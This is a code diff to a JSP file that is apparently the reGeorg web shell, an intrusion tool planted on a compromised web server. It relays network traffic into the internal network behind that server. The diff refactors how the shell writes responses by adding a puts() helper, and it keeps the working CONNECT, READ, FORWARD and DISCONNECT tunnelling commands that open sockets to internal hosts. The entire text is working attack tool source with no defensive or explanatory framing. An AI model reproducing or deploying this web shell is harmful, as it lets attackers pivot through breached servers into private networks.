@@ -19,13 +19,15 @@
                 response.setHeader("X-ERROR", "Failed connecting to target");
                 response.setHeader("X-STATUS", "FAIL");
             }
+            puts(response, "");
         } else if (cmd.compareTo("DISCONNECT") == 0) {
             SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
             try{
                 socketChannel.socket().close();
-            } catch (Exception ex) {
+            } catch (Exception e) {
             }
             session.removeAttribute(mark);
+            puts(response, "");
         } else if (cmd.compareTo("READ") == 0){
             SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
             try{
@@ -37,22 +39,20 @@
                     System.arraycopy(buf.array(), 0, data, 0, bytesRead);
                     byte[] base64 = b64en(data).getBytes();
                     so.write(base64, 0, base64.length);
-                    so.flush();
                     buf.clear();
                     bytesRead = socketChannel.read(buf);
                 }
-                response.setHeader("X-STATUS", "OK");
-                so.flush();
                 so.close();
-                
+                response.setHeader("X-STATUS", "OK");
+
             } catch (Exception e) {
                 response.setHeader("X-STATUS", "FAIL");
             }
-            
+
         } else if (cmd.compareTo("FORWARD") == 0){
             SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
             try {
-                
+
                 int readlen = request.getContentLength();
                 byte[] buff = new byte[readlen];
 
@@ -67,15 +67,16 @@
                     socketChannel.write(buf);
 
                 response.setHeader("X-STATUS", "OK");
-                
+
             } catch (Exception e) {
                 response.setHeader("X-ERROR", "POST request read filed");
                 response.setHeader("X-STATUS", "FAIL");
                 socketChannel.socket().close();
             }
-        } 
+            puts(response, "");
+        }
     } else {
-        out.print("Georg says, 'All seems fine'");  
+        puts(response, "Georg says, 'All seems fine'");
     }
 ]]></jsp:scriptlet>
 <jsp:declaration><![CDATA[
@@ -157,5 +158,12 @@
             buf.write((int) (((b3 & 0x03) << 6) | b4));
         }
         return buf.toByteArray();
+    }
+
+    void puts(HttpServletResponse r, String str) throws Exception {
+        byte[] bs = str.getBytes();
+        ServletOutputStream so = r.getOutputStream();
+        so.write(bs, 0, bs.length);
+        so.close();
     }
 ]]></jsp:declaration></jsp:root>
